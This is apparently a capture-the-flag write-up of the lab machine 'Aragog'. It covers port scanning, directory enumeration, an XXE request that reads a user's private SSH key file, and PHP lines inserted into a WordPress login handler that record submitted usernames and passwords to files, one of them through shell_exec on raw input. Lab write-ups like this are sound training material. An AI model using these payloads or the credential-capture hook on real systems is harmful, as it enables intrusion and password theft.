#  Aragog

# keyword

gobuster,  xxe 

# information

 nmap -sC -sV  -oA nmap 10.10.10.78
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-28 10:30 CST
Nmap scan report for 10.10.10.78
Host is up (0.29s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r--    1 ftp      ftp            86 Dec 21  2017 test.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.27
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ad:21:fb:50:16:d4:93:dc:b7:29:1f:4c:c2:61:16:48 (RSA)
|   256 2c:94:00:3c:57:2f:c2:49:77:24:aa:22:6a:43:7d:b1 (ECDSA)
|_  256 9a:ff:8b:e4:0e:98:70:52:29:68:0e:cc:a0:7d:5c:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

# apache in post method

```html
POST / HTTP/1.1
Host: 789
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

HTTP/1.1 400 Bad Request
Date: Thu, 28 Mar 2019 04:57:10 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 423
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<p>Additionally, a 400 Bad Request
error was encountered while trying to use an ErrorDocument to handle the request.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at aragog.htb Port 80</address>
</body></html>


```

### aragog.htb

# Enum php extension

```bash
 /opt/dirsearch/dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -e php -u http://aragog.htb -f

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: php | Threads: 10 | Wordlist size: 441041

Error Log: /opt/dirsearch/logs/errors-19-03-28_16-38-16.log

Target: http://aragog.htb

[16:38:17] Starting:
[16:38:18] 403 -  289B  - /.php
[16:38:23] 403 -  291B  - /icons/
[16:47:43] 200 -   46B  - /hosts.php
```

# XEE payload

XML External Entity

> An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.

**Internal Entity**: If an entity is declared within a DTD it is called as internal entity.
Syntax: `<!ENTITY entity_name "entity_value">`

**External Entity**: If an entity is declared outside a DTD it is called as external entity. Identified by `SYSTEM`.
Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

```php
POST /hosts.php HTTP/1.1
Host: aragog.htb
User-Agent: python2.u7
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 186

<?xml version="1.0"?>

<!DOCTYPE root [<!ENTITY file SYSTEM 'file:///home/florian/.ssh/id_rsa'>]>
<details>
    <subnet_mask>&file;</subnet_mask>
    <test>&file;</test>
</details>


```

#  login with rsa

#   file_put_contents

Hi Florian,

Thought we could use a wiki.  Feel free to log in and have a poke around – but as I’m messing about with a lot of changes I’ll probably be restoring the site from backup fairly frequently!

I’ll be logging in regularly and will email the wider team when I need some more testers

```php
shell_exec("echo ".$_POST['log'].":".$_POST['pwd']." >> /tmp/pass");

file_put_contents(".aaa", $_POST['log'].":".$_POST['pwd']."\n",  FILE_APPEND);
```

```php
case 'login' :
default:
	file_put_contents(".aaa", $_POST['log'].":".$_POST['pwd']."\n",  FILE_APPEND);
        $secure_cookie = '';
        $customize_login = isset( $_REQUEST['customize-login'] );
        if ( $customize_login )
                wp_enqueue_script( 'customize-base' );


```

 